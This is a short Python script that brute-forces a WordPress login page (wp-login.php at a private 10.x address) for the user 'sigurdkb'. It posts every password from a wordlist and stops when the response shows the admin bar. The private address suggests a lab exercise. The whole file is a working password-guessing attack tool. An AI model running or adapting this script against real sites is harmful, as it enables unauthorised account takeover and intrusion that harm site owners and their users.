import requests
"""
Import your wordlist
"""
try:
    file = open("wordlist.txt", "r")    # Import the wordlist
except FileNotFoundError:
    print("File not found")
except Exception as e:
    print(e)
f = file.read()
file.close()
user_name = 'sigurdkb'
passwordlist = f.split('\n')    #worlist is split and put in a list
guesses = passwordlist
#print(guesses)
url = 'http://10.225.147.164/wp-login.php'
teller = 0
for guess in guesses:
    response = requests.post(url, data={'password': guess})
    text = response.text
    response = requests.post(url, data={'log': user_name,'pwd': guess})
    text = response.text
    teller += 1
    print(teller)
    if 'wp-admin-bar-edit-profile' in text: # Stop when finds this text in the HTTP source, Not ideal but works
        print('Pasword is ------------- ' + guess)  # Print out the password and stops the program.
        break


    #print(guess + ': ' + text)